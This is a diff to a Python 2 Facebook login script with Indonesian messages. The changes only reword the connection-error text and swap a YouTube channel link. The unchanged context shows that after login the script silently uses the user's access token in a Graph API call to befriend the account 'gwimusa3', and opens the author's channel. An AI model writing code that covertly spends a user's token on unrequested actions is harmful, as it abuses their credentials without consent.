@@ -72,7 +72,7 @@ def login():
         try:
             br.open('https://m.facebook.com')
         except mechanize.URLError:
-            print '\n\x1b[1;91m[!] Tidak ada koneksi'
+            print '\n\x1b[1;91m[!] Jaringan Mu Jelek Mass'
             keluar()
 
         br._factory.is_html = True
@@ -97,11 +97,11 @@ def login():
                 zedd.close()
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://youtube.com/NjankSoekamti')
+                os.system('xdg-open https://www.youtube.com/channel/UCKdSySlEqFXVnR3-1TWD42Q')
                 time.sleep(2)
                 menu()
             except requests.exceptions.ConnectionError:
-                print '\n\x1b[1;91m[!] Tidak ada koneksi'
+                print '\n\x1b[1;91m[!] Jaringan Mu Jelek Mass'
                 keluar()
 
         if 'checkpoint' in url:
@@ -139,7 +139,7 @@ def menu():
             time.sleep(1)
             login()
         except requests.exceptions.ConnectionError:
-            print '\x1b[1;91m[!] Tidak ada koneksi'
+            print '\x1b[1;91m[!] Jaringan Mu Jelek Mass'
             keluar()
 
     os.system('clear')
